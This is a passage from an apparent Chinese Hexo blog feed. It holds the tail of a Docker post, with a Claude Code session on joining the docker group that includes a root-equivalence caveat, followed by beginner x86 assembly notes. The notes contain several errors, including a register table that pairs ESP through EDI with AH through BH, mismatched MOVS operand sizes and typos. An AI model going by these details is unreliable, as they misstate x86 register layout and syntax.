class="punctuation">:</span> <span class="number">16</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;IPv6Gateway&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;GlobalIPv6Address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;GlobalIPv6PrefixLen&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;DNSNames&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<h3 id="docker-exec"><a href="#docker-exec" class="headerlink" title="docker exec"></a>docker exec</h3><p>使用<code>docker exec -it NAME /bin/sh</code>可以进入一个容器，在容器里面执行linux命令</p>
<p><img src="/2025/10/09/docker/image-20251009195555110.png" alt="image-20251009195555110"></p>
<p>由于docker为了尽量压缩容器大小，所以很多工具都是没有的，先<code>cat /etc/os-release</code>看一下这个docker容器是什么发行版的</p>
<p>看到是Debian，所以下载工具是apt，先<code>apt update</code>更新一下索引</p>
<h2 id="普通用户直接运行docker"><a href="#普通用户直接运行docker" class="headerlink" title="普通用户直接运行docker"></a>普通用户直接运行docker</h2><p>听听claude怎么说：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Halo@raspberrypi:/mnt/ssd/docker $ claude</span><br><span class="line"></span><br><span class="line">  ▐▛███▜▌   Claude Code v2.0.10</span><br><span class="line"> ▝▜█████▛▘  Sonnet 4.5 · API Usage Billing</span><br><span class="line">   ▘▘ ▝▝    /mnt/ssd/docker</span><br><span class="line"></span><br><span class="line">&gt; 在我的电脑上docker只能sudo启动，怎么让普通用户也可以直接使用docker而不会permission deny </span><br><span class="line"></span><br><span class="line">● 要让普通用户不用 sudo 就能使用 Docker，需要将用户添加到 docker 用户组。以下是步骤：</span><br><span class="line"></span><br><span class="line">  1. 将当前用户添加到 docker 组：</span><br><span class="line">  sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line"></span><br><span class="line">  2. 重新登录或刷新组权限：</span><br><span class="line">  newgrp docker</span><br><span class="line">  或者注销后重新登录系统。</span><br><span class="line"></span><br><span class="line">  3. 验证是否成功：</span><br><span class="line">  docker ps</span><br><span class="line"></span><br><span class="line">  如果 docker 组不存在，可以先创建：</span><br><span class="line">  sudo groupadd docker</span><br><span class="line"></span><br><span class="line">  注意： 将用户添加到 docker 组相当于授予了 root 级别的权限，因为 Docker 守护进程以 root 身份运行。请确保只将可信用户添加到此组。</span><br><span class="line"></span><br><span class="line">Total cost:            <span class="variable">$0</span>.0206</span><br><span class="line">Total duration (API):  17.6s</span><br><span class="line">Total duration (wall): 1m 2s</span><br><span class="line">Total code changes:    0 lines added, 0 lines removed</span><br><span class="line">Usage by model:</span><br><span class="line">    claude-3-5-haiku:  1.1k input, 47 output, 0 cache <span class="built_in">read</span>, 0 cache write (<span class="variable">$0</span>.0011)</span><br><span class="line">       claude-sonnet:  3 input, 236 output, 11.5k cache <span class="built_in">read</span>, 3.3k cache write (<span class="variable">$0</span>.0195)</span><br><span class="line">       </span><br><span class="line">&gt; 测试：      </span><br><span class="line">Halo@raspberrypi:/mnt/ssd/docker $ sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">Halo@raspberrypi:/mnt/ssd/docker $ newgrp docker</span><br><span class="line">Halo@raspberrypi:/mnt/ssd/docker $ docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">&gt; 测试成功！</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>汇编</title>
    <url>/2023/12/10/compilation/</url>
    <content><![CDATA[<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h2><h3 id="二进制与十六进制"><a href="#二进制与十六进制" class="headerlink" title="二进制与十六进制"></a>二进制与十六进制</h3><p>十六进制相当于二进制的简写，可以看成二进制的另一种形式</p>
<table>
<thead>
<tr>
<th>二进制</th>
<th>十六进制</th>
</tr>
</thead>
<tbody><tr>
<td>0000</td>
<td>0</td>
</tr>
<tr>
<td>0001</td>
<td>1</td>
</tr>
<tr>
<td>0010</td>
<td>2</td>
</tr>
<tr>
<td>0011</td>
<td>3</td>
</tr>
<tr>
<td>0100</td>
<td>4</td>
</tr>
<tr>
<td>0101</td>
<td>5</td>
</tr>
<tr>
<td>0110</td>
<td>6</td>
</tr>
<tr>
<td>0111</td>
<td>7</td>
</tr>
<tr>
<td>1000</td>
<td>8</td>
</tr>
<tr>
<td>1001</td>
<td>9</td>
</tr>
<tr>
<td>1010</td>
<td>A</td>
</tr>
<tr>
<td>1011</td>
<td>B</td>
</tr>
<tr>
<td>1100</td>
<td>C</td>
</tr>
<tr>
<td>1101</td>
<td>D</td>
</tr>
<tr>
<td>1110</td>
<td>E</td>
</tr>
<tr>
<td>1111</td>
<td>F</td>
</tr>
</tbody></table>
<h3 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h3><h4 id="数据宽度-1"><a href="#数据宽度-1" class="headerlink" title="数据宽度"></a>数据宽度</h4><span id="more"></span>

<p>  数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（称为数据宽度），超过最多宽度的数据会被丢弃</p>
<h4 id="计算机中常见的数据宽度"><a href="#计算机中常见的数据宽度" class="headerlink" title="计算机中常见的数据宽度"></a>计算机中常见的数据宽度</h4><p>(1)位(BIT) 在计算机中存储数据的最小单位 能存一个1或一个0</p>
<p>(2)字节(Byte) 一个字节能存储8个0或1 范围从00000000<del>11111111 即0</del>0xFF</p>
<p>(3)字(Word) 能存16个0或1 0~0xFFFF</p>
<p>(4)双字(Doubleword) 存储32个0或1 0~0xFFFFFFFF</p>
<p><strong>如果要存储的数据超过最大宽度，那么多余的数据将被丢弃</strong></p>
<h3 id="无符号数"><a href="#无符号数" class="headerlink" title="无符号数"></a>无符号数</h3><p>无符号数的编码规则：数是多少就存多少</p>
<p>1001 1010 &#x3D;&gt; 9A</p>
<p>有符号数的编码规则：最高位是0，则该数为正数；最高位是1，则该数为负数</p>
<p>当该数为正时，编码规则与无符号数相同</p>
<!--more-->

<h3 id="原码，反码，补码"><a href="#原码，反码，补码" class="headerlink" title="原码，反码，补码"></a>原码，反码，补码</h3><h4 id="正数："><a href="#正数：" class="headerlink" title="正数："></a>正数：</h4><p><strong>原码：</strong>最高位为0，其余位为数值本身</p>
<p><strong>反码：</strong>正数的反码与原码相同</p>
<p><strong>补码：</strong>正数的补码与原码相同</p>
<p>6： 0000 0110</p>
<h4 id="负数："><a href="#负数：" class="headerlink" title="负数："></a>负数：</h4><p><strong>原码：</strong>最高位是1，其余位为数值本身的绝对值<br>​	-7： 1000 0111<br><strong>反码：</strong>除最高位，其他位1变0,0变1（除最高位取反）<br>​	-7： 1111 1000<br><strong>补码：</strong>负数的补码为反码+1<br>​	-7： 1111 1001</p>
<h4 id="假设数据宽度为1BYTE（8BIT）"><a href="#假设数据宽度为1BYTE（8BIT）" class="headerlink" title="假设数据宽度为1BYTE（8BIT）"></a>假设数据宽度为1BYTE（8BIT）</h4><p>无符号数：0 1 2 3 4   …………    FF（10进制255）</p>
<p>有符号数：<br>​	正数：0  ……7F</p>
<p>​	负数：FF……80</p>
<h4 id="假设数据宽度为Doubleword（32BIT）"><a href="#假设数据宽度为Doubleword（32BIT）" class="headerlink" title="假设数据宽度为Doubleword（32BIT）"></a>假设数据宽度为Doubleword（32BIT）</h4><p>无符号数：0 1 2 3 4 …… FFFFFFFF</p>
<p>有符号数：<br>​	正数：0 …… 7FFFFFFF</p>
<p>​	负数：FFFFFFFF …… 80000000</p>
<h3 id="计算机如何运算-位运算"><a href="#计算机如何运算-位运算" class="headerlink" title="计算机如何运算 &#x3D;&gt; 位运算"></a>计算机如何运算 &#x3D;&gt; 位运算</h3><p>计算机只认识0和1，计算机只能对0和1做运算（通常称为位运算）</p>
<h4 id="1-与运算"><a href="#1-与运算" class="headerlink" title="1.与运算"></a>1.与运算</h4><p>当两个位都为1时，结果才为1	比如：</p>
<p>​						1011 0001<br>​and(&amp;)		 	1101 1000<br>​———————————-<br>​						1001 0000</p>
<h4 id="2-或运算"><a href="#2-或运算" class="headerlink" title="2.或运算"></a>2.或运算</h4><p>只要有一个为1就是1</p>
<p>​						1011 0001<br>​or(|)			 	1101 1000<br>​———————————-<br>​						1111 1001</p>
<h4 id="3-异或运算"><a href="#3-异或运算" class="headerlink" title="3.异或运算"></a>3.异或运算</h4><p>不一样的时候是1</p>
<p>​						1011 0001<br>​xor(^)			   1101 1000<br>​———————————-<br>​						0110 1001</p>
<h4 id="4-非运算"><a href="#4-非运算" class="headerlink" title="4.非运算"></a>4.非运算</h4><p>0就是1 1就是0</p>
<p>not(~)			   1101 1000<br>​———————————-<br>​				 		0010 0111</p>
<h4 id="5-左移"><a href="#5-左移" class="headerlink" title="5.左移"></a>5.左移</h4><p>各二进位全部左移若干位，高位丢弃，低位补0</p>
<p>shl(&lt;&lt;)		1101 1000 左移2位为：0110 0000</p>
<h4 id="6-右移"><a href="#6-右移" class="headerlink" title="6.右移"></a>6.右移</h4><p>各二进位全部右移若干位，低位丢弃，高位补0或者补符号位</p>
<h5 id="shr"><a href="#shr" class="headerlink" title="shr"></a><strong>shr</strong></h5><p>1101 0101	&#x3D;右移2位&gt;	 0011 0101<br>对应C语言(&gt;&gt;)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a&gt;&gt;<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<h5 id="sar"><a href="#sar" class="headerlink" title="sar"></a><strong>sar</strong></h5><p>1101 0101	&#x3D;&gt; 	1111 0101<br>对应C语言(&gt;&gt;)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a&gt;&gt;<span class="number">2</span>);</span><br></pre></td></tr></table></figure>



<h3 id="通过位运算实现四则运算"><a href="#通过位运算实现四则运算" class="headerlink" title="通过位运算实现四则运算"></a>通过位运算实现四则运算</h3><h4 id="加"><a href="#加" class="headerlink" title="加"></a>加</h4><p>如：4+5的运算过程</p>
<p><strong>1）异或</strong></p>
<p>​				0000 0100<br>​				0000 0101<br>异或———————<br>​				0000 0001</p>
<p><strong>2）判断是否有进位</strong></p>
<p>​				0000 0100<br>​				0000 0101<br>与————————<br>​				0000 0100</p>
<p><strong>3）进位不为零 &#x3D;&gt; 左移</strong></p>
<p>​				0000 0100<br>左移———————-<br>​				0000 1000</p>
<p><strong>4）异或 &#x3D;&gt; 将第一次异或的值与进位后得到的值再异或</strong></p>
<p>​				0000 0001<br>​				0000 1000<br>异或———————-<br>​				0000 1001</p>
<p><strong>5）判断是否有进位</strong></p>
<p>​				0000 0001<br>​				0000 1000<br>与————————<br>​				0000 0000</p>
<p><strong>没有进位，就是加的结果</strong></p>
<h4 id="减"><a href="#减" class="headerlink" title="减"></a>减</h4><p>4-5的运算过程</p>
<p>4-5即4+(-5)</p>
<p><strong>1）异或</strong></p>
<p>​				0000 0100<br>​				1111 1011<br>异或———————-<br>​				1111 1111</p>
<p><strong>2）判断是否有进位</strong></p>
<p>​				0000 0100<br>​				1111 1011<br>与————————<br>​				0000 0000</p>
<p><strong>所以4-5的结果就为1111 1111 &#x3D; FF &#x3D; -1</strong></p>
<h4 id="乘"><a href="#乘" class="headerlink" title="乘"></a>乘</h4><p>X * Y 即X个Y相加</p>
<h4 id="除"><a href="#除" class="headerlink" title="除"></a>除</h4><p>X &#x2F; Y 本质为减法  X能减去多少个Y</p>
<h2 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h2><p><img src="/2023/12/10/compilation/image-20231212151255758.png" alt="image-20231212151255758"></p>
<h3 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h3><p>存储数据  CPU &gt; 内存 &gt; 硬盘</p>
<p>32位CPU：8  16  32<br>64位CPU：8  16  32  64</p>
<h3 id="2-通用寄存器"><a href="#2-通用寄存器" class="headerlink" title="2.通用寄存器"></a>2.通用寄存器</h3><p>32位寄存器：</p>
<p>EAX</p>
<p>ECX</p>
<p>EDX</p>
<p>EBX</p>
<p>ESP</p>
<p>EBP</p>
<p>ESI</p>
<p>EDI</p>
<h3 id="3-MOV指令"><a href="#3-MOV指令" class="headerlink" title="3.MOV指令"></a>3.MOV指令</h3><p>（1）MOV立即数到寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 1</span><br></pre></td></tr></table></figure>

<p>MOV寄存器到寄存器（将eax存的值赋值到ebx）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ebx, eax </span><br></pre></td></tr></table></figure>

<img src="/2023/12/10/compilation/image-20231212185902221.png" alt="image-20231212185902221" style="zoom:50%;">





<h3 id="4-16位寄存器，8位寄存器"><a href="#4-16位寄存器，8位寄存器" class="headerlink" title="4.16位寄存器，8位寄存器"></a>4.16位寄存器，8位寄存器</h3><p><img src="/2023/12/10/compilation/image-20231212191059169.png" alt="image-20231212191059169"><br><img src="/2023/12/10/compilation/image-20231212191212571.png" alt="image-20231212191212571" style="zoom:100%;"><br><img src="/2023/12/10/compilation/image-20231212191247696.png" alt="image-20231212191247696"><br><img src="/2023/12/10/compilation/image-20231212191318028.png" alt="image-20231212191318028"><br><img src="/2023/12/10/compilation/image-20231212191335820.png" alt="image-20231212191335820"></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th>通用寄存器</th>
</tr>
</thead>
<tbody><tr>
<td>32位</td>
<td>16位</td>
<td>8位</td>
</tr>
<tr>
<td>EAX</td>
<td>AX</td>
<td>AL</td>
</tr>
<tr>
<td>ECX</td>
<td>CX</td>
<td>CL</td>
</tr>
<tr>
<td>EDX</td>
<td>DX</td>
<td>DL</td>
</tr>
<tr>
<td>EBX</td>
<td>BX</td>
<td>BL</td>
</tr>
<tr>
<td>ESP</td>
<td>SP</td>
<td>AH</td>
</tr>
<tr>
<td>EBP</td>
<td>BP</td>
<td>CH</td>
</tr>
<tr>
<td>ESI</td>
<td>SI</td>
<td>DH</td>
</tr>
<tr>
<td>EDI</td>
<td>DI</td>
<td>BH</td>
</tr>
</tbody></table>
<p><img src="/2023/12/10/compilation/image-20231212192419732.png" alt="image-20231212192419732"></p>
<p><img src="/2023/12/10/compilation/image-20231212192619129.png" alt="image-20231212192619129"></p>
<p>8位寄存器</p>
<img src="/2023/12/10/compilation/image-20231212192939039.png" alt="image-20231212192939039" style="zoom:50%;">

<img src="/2023/12/10/compilation/image-20231212193232979.png" alt="image-20231212193232979" style="zoom:50%;">

<h3 id="5-内存"><a href="#5-内存" class="headerlink" title="5.内存"></a>5.内存</h3><h4 id="1-每个应用层序都会有自己的独立的4GB内存空间"><a href="#1-每个应用层序都会有自己的独立的4GB内存空间" class="headerlink" title="1.每个应用层序都会有自己的独立的4GB内存空间"></a>1.每个应用层序都会有自己的独立的4GB内存空间</h4><img src="/2023/12/10/compilation/image-20231212194824981.png" alt="image-20231212194824981" style="zoom:50%;">

<h4 id="2-内存地址"><a href="#2-内存地址" class="headerlink" title="2.内存地址"></a>2.内存地址</h4><p>(1)内存太大没法起名字，所以只能用编号。当我们想要向内存中存储数据，或者从内存读取数据时，必须用到这个编号。</p>
<p>(2)这个编号又称为内存地址（32位，前面0可以省略）[0x00000000]</p>
<h5 id="使用内存"><a href="#使用内存" class="headerlink" title="使用内存"></a>使用内存</h5><p><strong>1.存立即数到内存</strong></p>
<p>ptr ds:[   ]   里面写地址编号</p>
<p>地址和通用寄存器不一样，每个应用程序有4GB的内存，但是使用内存之前要先申请，不是可以随便用，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov byte ptr ds:[0xFFFFFFFF], 1</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231212210545890.png" alt="image-20231212210545890"></p>
<p>指令中的byte是数据大小，byte只有1字节，如果要写满数据，需要使用双字宽度dword，占4字节</p>
<p>使用word，可以存储2字节</p>
<p><strong>2.将寄存器中的值到内存</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[0x012FB000], eax</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231212215444670.png" alt="image-20231212215444670"></p>
<p><strong>3.将内存中的值存到寄存器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, dword ptr ds:[0x012FAFFC]</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231212221448664.png" alt="image-20231212221448664"></p>
<h4 id="3-内存地址的五种形式"><a href="#3-内存地址的五种形式" class="headerlink" title="3.内存地址的五种形式"></a>3.内存地址的五种形式</h4><h5 id="1-形式一：-立即数"><a href="#1-形式一：-立即数" class="headerlink" title="1.形式一：[立即数]"></a>1.形式一：[立即数]</h5><p>读取内存的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax,dword pyr ds:[0x012FAFFC]</span><br></pre></td></tr></table></figure>

<p>向内存中写入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[0x012FAFFC]</span><br></pre></td></tr></table></figure>

<h5 id="2-形式二：-reg-reg-寄存器"><a href="#2-形式二：-reg-reg-寄存器" class="headerlink" title="2.形式二：[reg] reg &#x3D;&gt; 寄存器"></a>2.形式二：[reg] reg &#x3D;&gt; 寄存器</h5><p>reg代表寄存器，可以是8个通用寄存器中的任意一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[eax],ebx</span><br></pre></td></tr></table></figure>

<p>此处，EAX指向一个内存地址”0x012FFCF8”，EBX的值为FFFFFFFF</p>
<p><img src="/2023/12/10/compilation/image-20231212224535417.png" alt="image-20231212224535417"></p>
<h5 id="3-形式三：-reg-立即数"><a href="#3-形式三：-reg-立即数" class="headerlink" title="3.形式三：[reg+立即数]"></a>3.形式三：[reg+立即数]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[ecx+4],eax</span><br></pre></td></tr></table></figure>

<p>此处ECX指向内存地址DBB000，+4后，[ECX+4]指向DBB004，然后将EAX中的值传到DBB004内存地址</p>
<p><img src="/2023/12/10/compilation/image-20231212230144179.png" alt="image-20231212230144179"></p>
<h5 id="4-形式四：-reg-reg-1-2-4-8"><a href="#4-形式四：-reg-reg-1-2-4-8" class="headerlink" title="4.形式四：[reg + reg * {1,2,4,8} ]"></a>4.形式四：[reg + reg * {1,2,4,8} ]</h5><p>寄存器加寄存器乘1,2,4,8中的一个数，一般C语言中数组生成的汇编语言是这样的</p>
<p>读取内存的值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0x13FFc4</span><br><span class="line">mov ebx, 2</span><br><span class="line">mov edx, dword ptr ds:[eax+ebx*2]</span><br></pre></td></tr></table></figure>

<p>向内存中写入数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0x137B000</span><br><span class="line">mov ecx, 2</span><br><span class="line">mov dword ptr ds:[eax+ecx*4], FFFF0001</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231212232344040.png" alt="image-20231212232344040"></p>
<p><img src="/2023/12/10/compilation/image-20231212232757738.png" alt="image-20231212232757738"></p>
<h5 id="5-形式五：-reg-reg-1-2-4-8-立即数"><a href="#5-形式五：-reg-reg-1-2-4-8-立即数" class="headerlink" title="5.形式五：[reg + reg * {1,2,4,8} + 立即数 ]"></a>5.形式五：[reg + reg * {1,2,4,8} + 立即数 ]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0x13FFc4</span><br><span class="line">mov ebx, 2</span><br><span class="line">mov edx, dword ptr ds:[eax+ebx*2+4]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 0x137B000</span><br><span class="line">mov ecx, 2</span><br><span class="line">mov dword ptr ds:[eax+ecx*4+4], FFFF0001</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/10/compilation/image-20231213141111995.png" alt="image-20231213141111995"></p>
<h3 id="6-数据的存储模式"><a href="#6-数据的存储模式" class="headerlink" title="6.数据的存储模式"></a>6.数据的存储模式</h3><p>1.大端模式：数据高位在低位，数据低位在高位</p>
<p>2.小端模式：数据低位在低位，数据高位在高位</p>
<p><img src="/2023/12/10/compilation/image-20231213142908404.png" alt="image-20231213142908404"></p>
<p>大端模式：1A	0x00000000</p>
<p>​				  2C	0x00000001</p>
<p><img src="/2023/12/10/compilation/image-20231213143809023.png" alt="image-20231213143809023"></p>
<p><img src="/2023/12/10/compilation/image-20231213143923697.png" alt="image-20231213143923697"></p>
<p>大端存储或小端存储受编译器影响，可以改成大端或小端</p>
<h3 id="7-常用的汇编指令"><a href="#7-常用的汇编指令" class="headerlink" title="7.常用的汇编指令"></a>7.常用的汇编指令</h3><h4 id="1-MOV指令"><a href="#1-MOV指令" class="headerlink" title="1.MOV指令"></a>1.MOV指令</h4><p>指令格式：<br>1、MOV r&#x2F;m8,r8<br>2、MOV r&#x2F;m16,r16	将寄存器的值存到寄存器或内存<br>3、MOV r&#x2F;m32,r32<br>4、MOV r8,r&#x2F;m8<br>5、MOV r16,r&#x2F;m16<br>6、MOV r32,r&#x2F;m32<br>7、MOV r8,imm8<br>8、MOV r16,imm16<br>9、MOV r32,imm32</p>
<p>r代表通用寄存器，r8代表8位寄存器<br>m代表内存，m8代表8位内存<br>imm代表立即数，imm8代表8位立即数</p>
<h4 id="2-ADD指令（加法指令）"><a href="#2-ADD指令（加法指令）" class="headerlink" title="2.ADD指令（加法指令）"></a>2.ADD指令（加法指令）</h4><p>ADD r&#x2F;m8,imm8<br>ADD r&#x2F;m16,imm16<br>ADD r&#x2F;m32,imm32<br>ADD r&#x2F;m16,imm8<br>ADD r&#x2F;m32,imm8<br>ADD r&#x2F;m8,r8<br>ADD r&#x2F;m16,r16<br>ADD r&#x2F;m32,r32<br>ADD r8,r&#x2F;m8<br>ADD r16,r&#x2F;m16<br>ADD r32,r&#x2F;m32</p>
<h4 id="3-SUB指令（减法指令）"><a href="#3-SUB指令（减法指令）" class="headerlink" title="3.SUB指令（减法指令）"></a>3.SUB指令（减法指令）</h4><p>SUB r&#x2F;m8,imm8<br>SUB r&#x2F;m16,imm16<br>SUB r&#x2F;m32,imm32<br>SUB r&#x2F;m16,imm8<br>SUB r&#x2F;m32,imm8<br>SUB r&#x2F;m8,r8<br>SUB r&#x2F;m16,r16<br>SUB r&#x2F;m32,r32<br>SUB r8,r&#x2F;m8<br>SUB r16,r&#x2F;m16<br>SUB r32,r&#x2F;m32</p>
<h4 id="4-AND指令（与运算）"><a href="#4-AND指令（与运算）" class="headerlink" title="4.AND指令（与运算）"></a>4.AND指令（与运算）</h4><p>AND r&#x2F;m8,imm8<br>AND r&#x2F;m16,imm16<br>AND r&#x2F;m32.imm32<br>AND r&#x2F;m16,imm8<br>AND r&#x2F;m32.imm8<br>AND r&#x2F;m8,r8<br>AND r&#x2F;m16,r16<br>AND r&#x2F;m32.,r32<br>AND r8,r&#x2F;m8<br>AND r16,r&#x2F;m16<br>AND r32,r&#x2F;m32</p>
<h4 id="5-XOR指令（异或运算）"><a href="#5-XOR指令（异或运算）" class="headerlink" title="5.XOR指令（异或运算）"></a>5.XOR指令（异或运算）</h4><p>XOR r&#x2F;m8,imm8<br>XOR r&#x2F;m16,imm16<br>XOR r&#x2F;m32.imm32<br>XOR r&#x2F;m16,imm8<br>XOR r&#x2F;m32,imm8<br>XOR r&#x2F;m8,r8<br>XOR r&#x2F;m16,r16<br>XOR r&#x2F;m32,r32<br>XOR r8,r&#x2F;m8<br>XOR r16.r&#x2F;m16<br>XOR r32,r&#x2F;m32</p>
<h4 id="6-NOT指令（非运算）"><a href="#6-NOT指令（非运算）" class="headerlink" title="6.NOT指令（非运算）"></a>6.NOT指令（非运算）</h4><p>NOT r&#x2F;m8<br>NOT r&#x2F;m16<br>NOT r&#x2F;m32</p>
<h4 id="7-MOVS指令-移动数据从内存到内存"><a href="#7-MOVS指令-移动数据从内存到内存" class="headerlink" title="7.MOVS指令 移动数据从内存到内存"></a>7.MOVS指令 移动数据从内存到内存</h4><p>MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]	简写为：MOVSB<br>MOVS WORD PTR ES:[EDI],BYTE PTR DS:[ESI]	简写为：MOVSW<br>MOVS DWORD PTR ES:[EDI],BYTE PTR DS:[ESI]	简写为：MOVSD</p>
<p>ESI存储的是一个地址，是一个内存编号，就是要复制的数据在哪里</p>
<p>EDI存储的是一个地址，是要把数据复制到哪里去</p>
<p><strong>标志寄存器 EFL</strong></p>
<p>00000204</p>
<img src="/2023/12/10/compilation/image-20231213214453116.png" alt="image-20231213214453116" style="zoom: 67%;">

<p>第十位为DF位，当DF位为0时，使用MOVS等指令，MOVS完之后，地址会自动递增（从低地址向高地址处理串）</p>
<p>​						当DF位为1时，使用MOVS等指令，MOVS完之后，地址会自动递减（从高地址向低地址处理串）</p>
<img src="/2023/12/10/compilation/20231213215254-1702475722564-2.png" alt="20231213215254" style="zoom:150%;">

<p>地址自动递增（递减）时，移动的长度取决于移动了一个字节、两个字节还是四个字节。</p>
<h4 id="8-STOS指令"><a href="#8-STOS指令" class="headerlink" title="8.STOS指令"></a>8.STOS指令</h4><p>将<strong>al&#x2F;ax&#x2F;eax</strong>的值存储到[EDI]指定的内存单元</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STOS BYTE PTR ES:[EDI]	每次存一个字节</span><br><span class="line">STOS WORD PTR ES:[EDI]	每次存两个字节</span><br><span class="line">STOS DWORD PTR ES:[EDI]	每次存四个字节</span><br></pre></td></tr></table></figure>

<h4 id="9-REP指令"><a href="#9-REP指令" class="headerlink" title="9.REP指令"></a>9.REP指令</h4><p>按照计数寄存器（ECX）中指定的次数重复执行字符串指令</p>
<p>计数寄存器是ECX，不是别的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOV ECX,10</span><br><span class="line">REP MOVSD</span><br><span class="line"></span><br><span class="line">MOV STOSD</span><br></pre></td></tr></table></figure>

<p>首先在ECX中存一个数，这个数是十六进制的，如果ECX中存10，则执行16次，每执行一次减一</p>
<h3 id="8-堆栈相关的指令"><a href="#8-堆栈相关的指令" class="headerlink" title="8.堆栈相关的指令"></a>8.堆栈相关的指令</h3><h4 id="1-堆栈"><a href="#1-堆栈" class="headerlink" title="1.堆栈"></a>1.堆栈</h4><p>1）就是一块内存，操作系统在程序启动时已经分配好的，供程序执行时使用。<br>2）和数据结构的堆栈无关<br>3）查看堆栈</p>
<h3 id="2-ESP寄存器（栈指针寄存器）"><a href="#2-ESP寄存器（栈指针寄存器）" class="headerlink" title="2.ESP寄存器（栈指针寄存器）"></a>2.ESP寄存器（栈指针寄存器）</h3><h3 id="3-PUSH指令"><a href="#3-PUSH指令" class="headerlink" title="3.PUSH指令"></a>3.PUSH指令</h3><p>功能： &lt; 1 &gt; 向堆栈中压入数据<br>            &lt; 2 &gt;修改栈顶指针ESP寄存器</p>
<p><img src="/2023/12/10/compilation/image-20231214001525192.png" alt="image-20231214001525192"></p>
<p>执行PUSH指令后：</p>
<p><img src="/2023/12/10/compilation/image-20231214001641026.png" alt="image-20231214001641026"></p>
<p>4被存储在了0x0053FF14中，并且ESP指向了当前的地址，因此PUSH指令是将MOV DWORD PTR DS:[]指令和SUB ESP,0x4简化了</p>
<p>除了PUSH立即数，还能PUSH寄存器</p>
<p><img src="/2023/12/10/compilation/image-20231214002210231.png" alt="image-20231214002210231"></p>
<h3 id="9-EIP寄存器"><a href="#9-EIP寄存器" class="headerlink" title="9.EIP寄存器"></a>9.EIP寄存器</h3><h4 id="JMP"><a href="#JMP" class="headerlink" title="JMP"></a>JMP</h4><p>EIP寄存器不能使用MOV进行修改</p>
<p>使用JMP指令修改EIP寄存器，EIP寄存器存储的是CPU下一次要执行的地址</p>
<p><img src="/2023/12/10/compilation/image-20231214150746795.png" alt="image-20231214150746795"></p>
<p>JUM指令可以跟立即数，也可以跟其他寄存器或内存</p>
<h4 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h4><p>1.将CALL后面的值存到EIP里<br>2.将CALL的下一行地址存到了堆栈中<br>3.ESP中的地址减0x4</p>
<p><img src="/2023/12/10/compilation/image-20231214155227379.png" alt="image-20231214155227379"></p>
<p><img src="/2023/12/10/compilation/image-20231214155540532.png" alt="image-20231214155540532"></p>
<h4 id="RET（return）"><a href="#RET（return）" class="headerlink" title="RET（return）"></a>RET（return）</h4><p>1.将当前栈顶指针ESP的值放到EIP里<br>2.将ESP加0x4</p>
<p>相当于：</p>
